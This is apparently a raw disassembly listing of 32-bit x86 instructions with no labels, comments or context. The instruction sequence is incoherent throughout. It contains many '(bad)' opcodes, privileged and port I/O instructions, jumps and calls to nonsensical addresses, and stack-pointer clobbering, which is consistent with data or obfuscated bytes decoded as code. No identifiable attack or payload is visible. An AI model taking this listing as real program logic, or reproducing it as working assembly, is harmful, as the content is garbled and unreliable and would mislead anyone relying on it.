  419f53:	xor    eax,0x7f80803
  419f58:	dec    ebp
  419f59:	pushf  
  419f5a:	add    esi,DWORD PTR [edx]
  419f5c:	clc    
  419f5d:	cmp    DWORD PTR [ecx],ecx
  419f5f:	or     al,0x8
  419f61:	add    al,BYTE PTR [ebp+0x2c]
  419f64:	xor    eax,0x7350845
  419f69:	or     BYTE PTR [ebp+0x7],cl
  419f6c:	lea    ebx,[ecx+eax*1+0x8b7232]
  419f73:	or     al,0x45
  419f75:	enter  0x4deb,0x8b
  419f79:	mov    edx,DWORD PTR [eax]
  419f7b:	cld    
  419f7c:	dec    ebp
  419f7d:	push   ebp
  419f7e:	sub    edx,DWORD PTR [ecx-0x75]
  419f81:	add    eax,0xf172fc
  419f86:	or     BYTE PTR [ebp+0x7],cl
  419f89:	add    eax,ecx
  419f8b:	or     al,0x72
  419f8d:	add    DWORD PTR [eax],eax
  419f8f:	mov    ebx,0x29c2c1
  419f94:	inc    ebp
  419f95:	mov    eax,DWORD PTR [ebx]
  419f97:	cmp    eax,0x3004d1c
  419f9d:	xbegin 0x66c72b97
  419fa3:	clc    
  419fa4:	or     BYTE PTR [ebp+0x45],al
  419fa7:	xor    BYTE PTR ds:0x78b089c,dh
  419fad:	adc    BYTE PTR [ebp+0x45],cl
  419fb0:	lea    eax,[ebp+0x33727501]
  419fb6:	add    cl,ch
  419fb8:	inc    ebp
  419fb9:	add    bl,ch
  419fbb:	add    BYTE PTR [ebx+0x45850845],cl
  419fc1:	je     0x419f4e
  419fc3:	push   ebx
  419fc4:	or     al,0x85
  419fc6:	dec    ebp
  419fc7:	std    
  419fc8:	mov    bh,bh
  419fca:	mov    BYTE PTR [ebp-0x75],al
  419fcd:	mov    edi,eax
  419fcf:	or     al,0x89
  419fd1:	inc    ebp
  419fd2:	clc    
  419fd3:	mov    esp,esp
  419fd5:	hlt    
  419fd6:	call   DWORD PTR [edi-0x37]
  419fd9:	push   ebp
  419fda:	or     al,0x51
  419fdc:	push   ebp
  419fdd:	xor    ebp,esp
  419fdf:	mov    esi,0x457251
  419fe4:	xor    esi,eax
  419fe6:	pushf  
  419fe7:	inc    ebp
  419fe8:	(bad)  
  419fe9:	mov    edi,eax
  419feb:	or     al,0x85
  419fed:	add    al,bh
  419fef:	inc    eax
  419ff1:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  419ff5:	or     ah,bh
  419ff7:	inc    eax
  419ff8:	push   ebp
  419ff9:	jmp    0x41a04c
  419ffb:	mov    eax,DWORD PTR ds:0xe8720c
  41a001:	mov    DWORD PTR [ebp-0x8],eax
  41a004:	jne    0x41a04b
  41a006:	jmp    0x419f93
  41a008:	mov    ebp,DWORD PTR [eax]
  41a00a:	clc    
  41a00b:	retf   0xff55
  41a00e:	push   ecx
  41a00f:	mov    DWORD PTR ds:0x757210,eax
  41a015:	mov    ecx,DWORD PTR [ebp-0x4]
  41a018:	sub    esp,DWORD PTR [ebx-0x77]
  41a01b:	dec    DWORD PTR [eax*4-0x74ca8abb]
  41a022:	or     ah,bh
  41a024:	pop    es
  41a025:	ds pushf 
  41a027:	push   DWORD PTR [edx]
  41a029:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  41a02f:	(bad)  
  41a030:	mov    bh,bh
  41a032:	jmp    0x41a020
  41a034:	leave  
  41a035:	jne    0x41a03f
  41a037:	call   0x2e9991
  41a03c:	in     al,dx
  41a03d:	dec    ebp
  41a03e:	add    dh,BYTE PTR [ebx]
  41a040:	add    BYTE PTR [ebx],al
  41a042:	inc    ebp
  41a043:	cmp    esi,DWORD PTR [ecx]
  41a045:	je     0x419fe3
  41a047:	mov    eax,edi
  41a049:	or     al,0xf0
  41a04b:	add    BYTE PTR [ebp+0x458bf845],al
  41a051:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  41a057:	adc    al,0x7
  41a059:	enter  0x9fc0,0xa5
  41a05d:	rol    BYTE PTR [eax],0x5e
  41a060:	mov    ecx,ecx
  41a062:	or     al,0xc
  41a064:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  41a06b:	jmp    0x41a06c
  41a06d:	push   ebp
  41a06e:	mov    esp,ebp
  41a070:	cld    
  41a071:	inc    ebp
  41a072:	inc    ebp
  41a073:	or     DWORD PTR [ecx+0x457dec10],0x0
  41a07a:	push   esi
  41a07b:	push   esi
  41a07c:	mov    edi,0x7af080f
  41a081:	add    bh,al
  41a083:	test   DWORD PTR [edi+ecx*1+0x3a732],ebx
  41a08a:	mov    DWORD PTR [edi],ecx
  41a08c:	adc    BYTE PTR [eax+0x45],al
  41a08f:	mov    ebp,eax
  41a091:	mov    ebp,edi
  41a093:	lock call edx
  41a096:	fcom   DWORD PTR [ebp+0x45]
  41a099:	mov    eax,0x148a8b
  41a09e:	push   ecx
  41a09f:	enter  0xc145,0x83
  41a0a3:	cmp    ecx,DWORD PTR [eax]
  41a0a5:	add    BYTE PTR [ebp+0x4d],al
  41a0a8:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  41a0ae:	call   0xffa19c1d
  41a0b3:	cmp    eax,DWORD PTR [ebp-0xc]
  41a0b6:	jmp    DWORD PTR [eax+edx*1-0x4e]
  41a0ba:	push   ebp
  41a0bb:	(bad)  
  41a0bc:	call   0x329ec0
  41a0c1:	mov    bh,0xdb
  41a0c3:	cld    
  41a0c4:	or     BYTE PTR [ebp+0x45],bl
  41a0c7:	(bad)  
  41a0c8:	call   0xff7b9d58
  41a0cd:	add    al,BYTE PTR [ebp+0x37]
  41a0d0:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  41a0d6:	jne    0x41a0d8
  41a0d8:	(bad)  
  41a0d9:	cmp    edi,esp
  41a0db:	jne    0x41a10e
  41a0dd:	mov    edi,edi
  41a0df:	or     BYTE PTR [ebx-0x307f0b49],cl
  41a0e5:	pop    ds
  41a0e6:	into   
  41a0e7:	je     0x41a0aa
  41a0e9:	mov    ebx,DWORD PTR [esi]
  41a0eb:	or     BYTE PTR [ebp-0x49],al
  41a0ee:	mov    esp,DWORD PTR [esi-0x77]
  41a0f1:	mov    esi,0x4451f0c
  41a0f6:	mov    eax,DWORD PTR [eax]
  41a0f8:	or     al,0x66
  41a0fa:	sar    bl,0x3b
  41a0fd:	xor    esi,DWORD PTR [ebp+0x66]
  41a100:	xor    ecx,edi
  41a102:	pop    edi
  41a103:	adc    bl,BYTE PTR [ebx+0x70]
  41a106:	ret    0xff
  41a109:	cld    
  41a10a:	inc    ebp
  41a10b:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  41a111:	cld    
  41a112:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  41a119:	push   0xffffff83
  41a11b:	pop    edi
  41a11c:	or     BYTE PTR [ebp+0x53],dh
  41a11f:	xorps  xmm1,xmm2
  41a122:	test   BYTE PTR [eax+eax*1],bh
  41a125:	add    BYTE PTR [eax],al
  41a127:	adc    eax,eax
  41a129:	add    DWORD PTR [eax+esi*2-0xff7b00],0xffffffb7
  41a131:	jmp    DWORD PTR [eax]
  41a133:	ror    al,0x5e
  41a136:	inc    ebp
  41a137:	leave  
  41a138:	xor    ecx,DWORD PTR [eax]
  41a13a:	and    DWORD PTR [ebx-0x3ec10708],ecx
  41a140:	add    ah,al
  41a142:	xor    edi,edi
  41a144:	xor    DWORD PTR [ebx],0x66003304
  41a14a:	mov    DWORD PTR [ebp-0xc],ecx
  41a14d:	pcmpgtw mm0,mm0
  41a150:	add    dl,ah
  41a152:	leave  
  41a153:	mov    edi,DWORD PTR [esi-0x7d]
  41a156:	push   ax
  41a158:	dec    ebp
  41a159:	mov    esi,DWORD PTR [ebx-0x75]
  41a15c:	lea    ebp,[eax-0x7c00ff04]
  41a162:	xor    eax,DWORD PTR [eax]
  41a164:	sysret 
  41a166:	dec    ebp
  41a167:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  41a16e:	push   WORD PTR [ecx+0x8]
  41a172:	jne    0x41a135
  41a174:	ud0    ecx,DWORD PTR [ecx]
  41a177:	mov    eax,edx
  41a179:	lods   al,BYTE PTR ds:[esi]
  41a17a:	add    BYTE PTR [eax],al
  41a17c:	data16 (bad) 
  41a17e:	iret   
  41a17f:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  41a186:	cli    
  41a187:	inc    ebp
  41a188:	cmp    al,0x8d
  41a18a:	add    BYTE PTR [esi+0x2d],ah
  41a18d:	inc    ebp
  41a18e:	pop    ebp
  41a18f:	lea    ecx,[edi]
  41a191:	mov    dl,bh
  41a193:	add    BYTE PTR [edi],cl
  41a195:	mov    DWORD PTR [eax+eax*8],edi
  41a198:	mov    ebx,0x3b87
  41a19d:	add    BYTE PTR [ebx],ch
  41a19f:	inc    ebp
  41a1a0:	data16 (bad) 
  41a1a2:	clc    
  41a1a3:	int3   
  41a1a4:	cmp    eax,DWORD PTR [eax]
  41a1a6:	je     0x41a131
  41a1a8:	push   0xffffffc8
  41a1aa:	pop    edi
  41a1ab:	xchg   DWORD PTR [ebp+0x0],eax
  41a1ae:	data16 add BYTE PTR [ebp+0x45],cl
  41a1b2:	lea    cx,[ebp+0x10]
  41a1b6:	jb     0x41a1b8
  41a1b8:	jmp    0x41a143
  41a1ba:	call   eax
  41a1bc:	clc    
  41a1bd:	xchg   DWORD PTR [edi+0x1],edi
  41a1c0:	mov    eax,DWORD PTR [eax]
  41a1c2:	or     BYTE PTR [ebp-0x49],al
  41a1c5:	lea    eax,[eax+0x74003154]
  41a1cb:	push   edi
  41a1cc:	inc    edx
  41a1cd:	jge    0x41a1ce
  41a1cf:	mov    DWORD PTR [edi],ecx
  41a1d1:	fdiv   DWORD PTR [edi-0x6]
  41a1d4:	inc    DWORD PTR [eax]
  41a1d6:	xor    edx,DWORD PTR [eax+0x5f]
  41a1d9:	xchg   DWORD PTR [ebx+0x1],ebx
  41a1dc:	ret    0x0
  41a1df:	xor    BYTE PTR [ebp-0x51],cl
  41a1e2:	cmp    edi,0xf0ff89fc
  41a1e8:	data16 ror al,0x84
  41a1ec:	rol    BYTE PTR [eax],0x3b
  41a1ef:	add    al,dh
  41a1f1:	dec    eax
  41a1f2:	xchg   esp,eax
  41a1f3:	push   ebx
  41a1f4:	jmp    0x41a181
  41a1f6:	push   ebp
  41a1f7:	add    esp,ebp
  41a1f9:	add    ebp,esp
  41a1fb:	mov    edx,DWORD PTR [edi+0x24]
  41a1fe:	clc    
  41a1ff:	dec    esi
  41a200:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  41a206:	cmp    BYTE PTR [ebx],al
  41a208:	jne    0x41a193
  41a20a:	xor    esp,eax
  41a20c:	jmp    0x44a38f
  41a211:	add    ebp,DWORD PTR [ecx+ecx*4]
  41a214:	jne    0x41a20a
  41a216:	call   0xffcb9f70
  41a21b:	clc    
  41a21c:	xchg   edi,eax
  41a21d:	sti    
  41a21e:	add    DWORD PTR [ebx],eax
  41a220:	add    BYTE PTR [ebp+0x47],bl
  41a223:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  41a229:	pop    ebp
  41a22a:	mov    DWORD PTR [esi-0x48],esi
  41a22d:	jmp    0x41a276
  41a22f:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  41a235:	(bad)  
  41a237:	cmp    al,0x0
  41a239:	cmp    eax,DWORD PTR [ebp+0x18]
  41a23c:	lea    ebx,[ebp-0x56]
  41a23f:	jle    0x41a241
  41a241:	jae    0x41a1cc
  41a243:	mov    eax,esp
  41a245:	call   0xb900:0x8b005587
  41a24c:	inc    ebp
  41a24d:	push   ebp
  41a24e:	lea    ecx,[ebp-0x27ff4f12]
  41a254:	mov    eax,edi
  41a256:	int3   
  41a257:	push   ebp
  41a258:	xchg   edi,eax
  41a25a:	add    esp,ebp
  41a25c:	add    BYTE PTR [eax],al
  41a25e:	inc    ebp
  41a25f:	add    BYTE PTR [ebp+0x8b3255],cl
  41a265:	cld    
  41a266:	mov    DWORD PTR [edx],edi
  41a268:	aam    0x75
  41a26a:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  41a270:	mov    DWORD PTR [ebx-0x50],edx
  41a273:	test   BYTE PTR [ebp-0x1],0xe8
  41a277:	mov    eax,DWORD PTR [eax]
  41a279:	hlt    
  41a27a:	add    al,al
  41a27c:	mov    eax,DWORD PTR ds:0x890045a8
  41a282:	dec    DWORD PTR [ebx+0x45fdf0e8]
  41a288:	inc    DWORD PTR [eax*2+0xf75854d]
  41a28f:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  41a295:	call   0x7297ffd6
  41a29a:	je     0x41a2fa
  41a29c:	js     0x41a2fd
  41a29e:	lock ret 0x7e
  41a2a2:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  41a2a8:	mov    edi,edi
  41a2aa:	sbb    al,bl
  41a2ac:	clc    
  41a2ad:	add    BYTE PTR [ebp-0x73],bh
  41a2b0:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  41a2b6:	ror    BYTE PTR [eax],1
  41a2b8:	dec    ebp
  41a2b9:	xchg   ebp,eax
  41a2ba:	mov    edi,edi
  41a2bc:	in     al,0x8b
  41a2be:	jge    0x41a249
  41a2c0:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  41a2c6:	clc    
  41a2c7:	pop    esi
  41a2c8:	fist   DWORD PTR [ebp+0x5d398b5d]
  41a2ce:	clc    
  41a2cf:	add    al,0x6e
  41a2d1:	mov    eax,DWORD PTR [ebx]
  41a2d3:	mov    BYTE PTR [ebp+0x0],dl
  41a2d6:	mov    edx,DWORD PTR [ebx-0x20]
  41a2d9:	adc    esi,DWORD PTR [edi+0x5e005f3e]
  41a2df:	add    eax,0x3b3b73
  41a2e4:	adc    al,0x89
  41a2e6:	pop    eax
  41a2e7:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  41a2eb:	ret    0xf08
  41a2ee:	cmp    al,0x2
  41a2f0:	mov    edx,eax
  41a2f2:	cld    
  41a2f3:	add    BYTE PTR [ebp+0x66],dl
  41a2f6:	add    eax,ebx
  41a2f8:	add    esp,eax
  41a2fa:	sub    eax,eax
  41a2fc:	or     BYTE PTR [ecx-0x77f474bb],cl
  41a302:	add    BYTE PTR [eax],al
  41a304:	mov    DWORD PTR [ebx-0x24],ebx
  41a307:	push   edi
  41a308:	push   ebp
  41a309:	clc    
  41a30a:	add    DWORD PTR [esi+0x1b0100],0x45
  41a311:	out    0xff,eax
  41a313:	add    edx,DWORD PTR [eax]
  41a315:	jmp    0x41a2ff
  41a317:	cmp    ch,0x47
  41a31a:	(bad)  
  41a31b:	jmp    0x40c72b6d
  41a320:	je     0x41a2ac
  41a322:	mov    eax,DWORD PTR [eax-0x10c78f04]
  41a328:	inc    ebp
  41a329:	add    BYTE PTR [ebx-0x770375],al
  41a32f:	add    ah,ch
  41a331:	add    edx,esp
  41a333:	pop    edi
  41a334:	pop    ebp
  41a335:	push   ebp
  41a336:	inc    ebx
  41a337:	in     al,dx
  41a338:	pop    ebp
  41a339:	in     al,dx
  41a33a:	cmp    edx,DWORD PTR [edi-0x8]
  41a33d:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  41a344:	add    al,0x47
  41a346:	push   ebp
  41a347:	mov    esp,ebp
  41a349:	in     al,0x45
  41a34b:	dec    ebp
  41a34c:	push   esi
  41a34d:	test   DWORD PTR [eax+0xfb010f],esi
  41a353:	add    BYTE PTR [eax+0xc018b],dh
  41a359:	leave  
  41a35a:	inc    ebp
  41a35b:	test   al,ch
  41a35d:	add    dh,bh
  41a35f:	add    bh,bh
  41a361:	dec    ebp
  41a362:	push   cs
  41a363:	mov    DWORD PTR [ecx],eax
  41a365:	hlt    
  41a366:	push   es
  41a367:	dec    ebp
  41a368:	leave  
  41a369:	mov    DWORD PTR [eax],ecx
  41a36b:	clc    
  41a36c:	cmovge eax,ecx
  41a36f:	mov    ecx,0x85c2f0
  41a375:	clc    
  41a376:	pop    DWORD PTR [ebp+0x1]
  41a379:	push   ebx
  41a37a:	add    BYTE PTR [ebp-0x15],bh
  41a37d:	push   esi
  41a37e:	xor    eax,0x898a45
  41a383:	cld    
  41a384:	add    al,0x45
  41a386:	add    BYTE PTR [ebx],dh
  41a388:	pushfw 
  41a38a:	add    DWORD PTR [esi+0x78308c1],edi
  41a390:	add    ah,BYTE PTR [edi+esi*4-0x33]
  41a394:	mov    ebx,0xc4e8b
  41a399:	(bad)  
  41a39a:	cmp    ecx,ebx
  41a39c:	jne    0x41a366
  41a39e:	xor    ecx,DWORD PTR [ebp+0x66]
  41a3a1:	jmp    0xc8a3a7
  41a3a6:	add    DWORD PTR [ebp+0x0],eax
  41a3a9:	mov    eax,ebx
  41a3ab:	or     al,0x8b
  41a3ad:	(bad)  
  41a3ae:	mov    ecx,esi
  41a3b0:	mov    BYTE PTR [eax+eax*1+0x664c138],cl
  41a3b7:	mov    eax,edi
  41a3b9:	or     BYTE PTR [edx],cl
  41a3bb:	shl    cl,cl
  41a3bd:	icebp  
  41a3be:	add    BYTE PTR [ebp+0x37],0x8b
  41a3c2:	or     BYTE PTR [edx+eax*2],cl
  41a3c5:	(bad)  
  41a3c6:	or     cl,dh
  41a3c8:	stc    
  41a3c9:	shl    DWORD PTR [ebp-0x30],0xc6
  41a3cd:	xor    al,0x0
  41a3cf:	inc    ebp
  41a3d0:	xchg   BYTE PTR [ebx],al
  41a3d2:	add    esp,edi
  41a3d4:	add    BYTE PTR [ebp-0x39],cl
  41a3d7:	mov    al,bl
  41a3d9:	test   DWORD PTR [ebx+0x1c348375],ecx
  41a3df:	sub    al,0xbf
  41a3e1:	jmp    0x41a368
  41a3e3:	mov    edi,eax
  41a3e5:	lock jge 0x41a3d9
  41a3e8:	lea    esi,[edx-0x74bad501]
  41a3ee:	mov    ebp,esp
  41a3f0:	or     cl,dh
  41a3f2:	leave  
  41a3f3:	add    al,BYTE PTR [eax+eax*4-0x37ff9c00]
  41a3fa:	dec    ebp
  41a3fb:	dec    ebp
  41a3fc:	test   DWORD PTR [ebx],eax
  41a3fe:	paddb  mm6,mm0
  41a401:	add    DWORD PTR [eax],eax
  41a403:	dec    ebp
  41a404:	mov    ecx,DWORD PTR [ebx-0x63b217f0]
  41a40a:	mov    esi,DWORD PTR [edx]
  41a40c:	or     al,0x2b
  41a40e:	dec    ebp
  41a40f:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  41a415:	mov    esp,esi
  41a417:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  41a41e:	mov    DWORD PTR [ebx],ebp
  41a420:	call   0xc752d50
  41a425:	mov    DWORD PTR [ebp+0x10],ecx
  41a428:	(bad)  
  41a429:	push   0x8b85ff10
  41a42e:	clc    
  41a42f:	or     al,0x55
  41a431:	(bad)  
  41a432:	push   ecx
  41a433:	retf   
  41a434:	mov    ebx,0xff4d8dc8
  41a439:	mov    DWORD PTR [ebp+0x8],eax
  41a43c:	xor    eax,DWORD PTR [ebp-0x75]
  41a43f:	cmp    ebp,DWORD PTR [ebx]
  41a441:	lsl    ebx,WORD PTR [edi-0x8]
  41a445:	call   DWORD PTR [ebx-0x741bff75]
  41a44b:	(bad)  
  41a44c:	or     al,0x5b
  41a44e:	dec    ebp
  41a44f:	or     BYTE PTR [ebx],dh
  41a451:	inc    ebp
  41a452:	xor    esi,DWORD PTR ds:0x708088d
  41a458:	in     eax,0x9c
  41a45a:	add    BYTE PTR [edx],dh
  41a45c:	inc    ebp
  41a45d:	pop    edi
  41a45e:	xor    eax,edx
  41a460:	test   DWORD PTR [eax],0x83108b8b
  41a466:	dec    ebp
  41a467:	adc    al,0x33
  41a469:	inc    ebp
  41a46a:	xor    esi,DWORD PTR [ecx]
  41a46c:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  41a473:	test   DWORD PTR [eax],ecx
  41a475:	clc    
  41a476:	inc    ebp
  41a477:	add    ecx,DWORD PTR [ebx+0xc7f445]
  41a47d:	hlt    
  41a47e:	leave  
  41a47f:	test   DWORD PTR [esi],eax
  41a481:	clc    
  41a482:	inc    edi
  41a483:	push   edi
  41a484:	aaa    
  41a485:	inc    ebp
  41a486:	pop    ss
  41a487:	ror    DWORD PTR [ebp-0x29],1
  41a48a:	or     BYTE PTR [ebx+0x4d64fc55],0xd1
  41a491:	mov    eax,0x780084d
  41a496:	push   ebp
  41a497:	clc    
  41a498:	ret    0xe99c
  41a49b:	xor    dl,dl
  41a49d:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  41a4a3:	js     0x88830a2
  41a4a9:	dec    ebp
  41a4aa:	push   ebp
  41a4ab:	mov    edi,DWORD PTR [eax+0xc872fc]
  41a4b1:	lock enter 0xceca,0xf2
  41a4b6:	retf   0x18ce
  41a4b9:	jne    0x41a508
  41a4bb:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  41a4c1:	enter  0xf0d6,0xca
  41a4c5:	retf   0xf2c8
  41a4c8:	into   
  41a4c9:	out    dx,al
  41a4ca:	dec    ebp
  41a4cb:	dec    ebp
  41a4cc:	jmp    0xff45a404
  41a4d1:	xor    eax,DWORD PTR [ebp-0x15]
  41a4d4:	xor    esi,DWORD PTR [ebx]
  41a4d6:	mov    esi,DWORD PTR [ebx]
  41a4d8:	sub    eax,DWORD PTR [ebx]
  41a4da:	add    eax,DWORD PTR [ebx]
  41a4dc:	or     bl,dl
  41a4de:	dec    ebp
  41a4df:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  41a4e5:	xor    eax,DWORD PTR [ebp-0xf00073]
  41a4eb:	jb     0x41a532
  41a4ed:	add    BYTE PTR [ebx],dh
  41a4ef:	dec    ebp
  41a4f0:	pop    esi
  41a4f1:	mov    ebp,ebx
  41a4f3:	cld    
  41a4f4:	mov    esi,eax
  41a4f6:	call   0x520ffac3
  41a4fb:	stc    
  41a4fc:	add    eax,0x4572aa
  41a501:	pop    edi
  41a502:	leave  
  41a503:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  41a50a:	in     al,dx
  41a50b:	mov    eax,edi
  41a50d:	xor    eax,0xf8008520
  41a513:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  41a51a:	mov    eax,DWORD PTR [ebp-0x77]
  41a51d:	xor    al,bh
  41a51f:	pushf  
  41a520:	inc    ebp
  41a521:	(bad)  
  41a522:	cmp    eax,ebp
  41a524:	pushf  
  41a525:	xchg   BYTE PTR [esi-0x8],dl
  41a528:	mov    edi,0x8518e4ec
  41a52e:	jmp    0xf056:0x8b457df8
  41a535:	push   ebp
  41a536:	push   ebp
  41a537:	push   ecx
  41a538:	push   ecx
  41a539:	push   edi
  41a53a:	xor    eax,esi
  41a53c:	mov    edx,0x32729c
  41a541:	add    ecx,eax
  41a543:	mov    edx,edi
  41a545:	clc    
  41a546:	retf   0xaf45
  41a549:	cmp    ebx,ebp
  41a54b:	pushf  
  41a54c:	mov    eax,edi
  41a54e:	clc    
  41a54f:	cld    
  41a550:	jne    0x41a56a
  41a552:	xor    ebp,edx
  41a554:	xor    eax,DWORD PTR [ebp+0x3]
  41a557:	or     BYTE PTR [ebx],al
  41a559:	add    BYTE PTR [ebp-0x7747475],al
  41a55f:	hlt    
  41a560:	dec    ebp
  41a561:	dec    ebp
  41a562:	je     0x41a597
  41a564:	xor    esi,DWORD PTR [ebx]
  41a566:	xor    eax,DWORD PTR [ebx]
  41a568:	add    eax,DWORD PTR [ebx]
  41a56a:	add    ecx,DWORD PTR [edi]
  41a56c:	rol    ecx,cl
  41a56e:	mov    esi,DWORD PTR [ecx]
  41a570:	in     al,dx
  41a571:	inc    ebp
  41a572:	enter  0xca2b,0x33
  41a576:	icebp  
  41a577:	mov    DWORD PTR [edx],ecx
  41a579:	clc    
  41a57a:	lock pop ebp
  41a57c:	enter  0xf2e8,0xfe
  41a580:	retf   0xeeff
  41a583:	inc    ebp
  41a584:	jne    0x41a511
  41a586:	mov    edi,eax
  41a588:	cld    
  41a589:	dec    ebp
  41a58a:	enter  0xbc89,0x8d
  41a58e:	pushf  
  41a58f:	sti    
  41a590:	xor    bh,bh
  41a592:	mov    eax,DWORD PTR [ebp-0xc]
  41a595:	mov    esi,DWORD PTR [ebp-0x4]
  41a598:	xor    eax,esi
  41a59a:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9c]
  41a5a1:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  41a5a7:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  41a5ad:	(bad)  
  41a5ae:	push   ebp
  41a5af:	shr    esp,0x4d
  41a5b2:	in     al,dx
  41a5b3:	cmp    eax,DWORD PTR [esi+esi*2]
  41a5b6:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  41a5bc:	pushf  
  41a5bd:	mov    edi,0x85c7f445
  41a5c3:	call   0xf8872cc0
  41a5c8:	xor    ebx,ebx
  41a5ca:	pushf  
  41a5cb:	popa   
  41a5cc:	push   ebx
  41a5cd:	dec    ebp
  41a5ce:	inc    ebp
  41a5cf:	mov    esi,DWORD PTR [esi]
  41a5d1:	clc    
  41a5d2:	pushf  
  41a5d3:	into   
  41a5d4:	mov    ecx,edi
  41a5d6:	in     al,dx
  41a5d7:	call   0x8b49eb9a
  41a5dc:	pop    es
  41a5dd:	or     BYTE PTR [ebx],dh
  41a5df:	or     BYTE PTR [edi+0x8a724d],bh
  41a5e5:	or     eax,edi
  41a5e7:	push   ebp
  41a5e8:	inc    ebp
  41a5e9:	cmpxchg8b (bad)
  41a5ea:	(bad)  
  41a5eb:	leave  
  41a5ec:	loopne 0x41a5b8
  41a5ee:	test   DWORD PTR [ebp-0x8],ecx
  41a5f1:	mov    eax,DWORD PTR [ebp-0x18]
  41a5f4:	rcl    DWORD PTR [ebp-0x29],1
  41a5f7:	xor    eax,edi
  41a5f9:	add    esi,eax
  41a5fb:	and    eax,DWORD PTR [eax]
  41a5fd:	mov    eax,DWORD PTR [eax]
  41a5ff:	(bad)  
  41a600:	leave  
  41a601:	sti    
  41a602:	inc    ebp
  41a603:	dec    DWORD PTR [ebx-0x39cc13ab]
  41a609:	mov    esi,ecx
  41a60b:	clc    
  41a60c:	(bad)  
  41a60d:	dec    ebp
  41a60e:	iret   
  41a60f:	xor    ebp,DWORD PTR [edi-0x74f71473]
  41a615:	jb     0x41a613
  41a617:	add    bh,al
  41a619:	inc    ebp
  41a61a:	(bad)  
  41a61b:	mov    eax,DWORD PTR [ebp-0xc]
  41a61e:	(bad)  
  41a61f:	xabort 0x64
  41a622:	loopne 0x41a5f1
  41a624:	jmp    FWORD PTR [ebx]
  41a626:	mov    DWORD PTR [ebx],eax
  41a628:	clc    
  41a629:	lock inc ebp
  41a62b:	dec    ebp
  41a62c:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  41a632:	loopne 0x41a667
  41a634:	inc    DWORD PTR [ebx]
  41a636:	mov    edi,DWORD PTR [ebx]
  41a638:	hlt    
  41a639:	jne    0x41a688
  41a63b:	mov    esi,DWORD PTR [ebx]
  41a63d:	in     al,0x8d
  41a63f:	dec    ebp
  41a640:	or     BYTE PTR [ebx],dh
  41a642:	jb     0x41a647
  41a644:	add    BYTE PTR [edi+0x45],bl
  41a647:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  41a64d:	add    BYTE PTR [ebx],dh
  41a64f:	mov    esi,DWORD PTR [ebx]
  41a651:	sub    DWORD PTR [ebx],0x6c
  41a654:	mov    eax,DWORD PTR [ebp-0x4]
  41a657:	xor    eax,ecx
  41a659:	pushf  
  41a65a:	mov    ecx,0x338545ba
  41a65f:	clc    
  41a660:	add    edx,DWORD PTR [ebp-0x77]
  41a663:	mov    edi,eax
  41a665:	adc    al,0x45
  41a667:	inc    ebp
  41a668:	mov    ebx,DWORD PTR ss:[esp+edx*1+0x1eb808b]
  41a670:	mov    eax,DWORD PTR [eax]
  41a672:	loopne 0x41a6c1
  41a674:	inc    ebp
  41a675:	mov    esi,DWORD PTR [ebx]
  41a677:	mov    eax,DWORD PTR [ebx]
  41a679:	nop
  41a67a:	rol    DWORD PTR [eax],cl
  41a67c:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  41a682:	mov    cl,BYTE PTR [ecx+0x450bf888]
  41a688:	dec    ebp
  41a689:	push   esi
  41a68a:	mov    edi,DWORD PTR [edi+0x7b608f8]
  41a690:	xor    eax,edi
  41a692:	mov    DWORD PTR [eax+ecx*1-0x74fcb2ce],ebx
  41a699:	mov    DWORD PTR [eax],ecx
  41a69b:	in     al,dx
  41a69c:	into   
  41a69d:	inc    ebp
  41a69e:	iret   
  41a69f:	xor    ecx,edx
  41a6a1:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  41a6a8:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  41a6ae:	dec    ebp
  41a6af:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  41a6b5:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9c]
  41a6bc:	mov    DWORD PTR [ecx+0x8],eax
  41a6bf:	mov    eax,DWORD PTR [ebp-0x8]
  41a6c2:	xor    ebx,DWORD PTR [eax]
  41a6c4:	mov    ecx,0xff8b8d40
  41a6c9:	clc    
  41a6ca:	enter  0x4d49,0x48
  41a6ce:	mov    eax,edx
  41a6d0:	lock enter 0x4545,0x8b
  41a6d5:	mov    esi,eax
  41a6d7:	cmp    dh,al
  41a6d9:	rol    edi,0x3
  41a6dc:	enter  0x9140,0x89
  41a6e0:	inc    ebp
  41a6e1:	adc    al,0x8b
  41a6e3:	inc    ebp
  41a6e4:	clc    
  41a6e5:	xor    eax,esi
  41a6e7:	add    eax,edi
  41a6e9:	mov    DWORD PTR [esi-0x24],ebx
  41a6ec:	rol    DWORD PTR [ebp-0x37],0x33
  41a6f0:	add    al,0x3
  41a6f2:	push   ebp
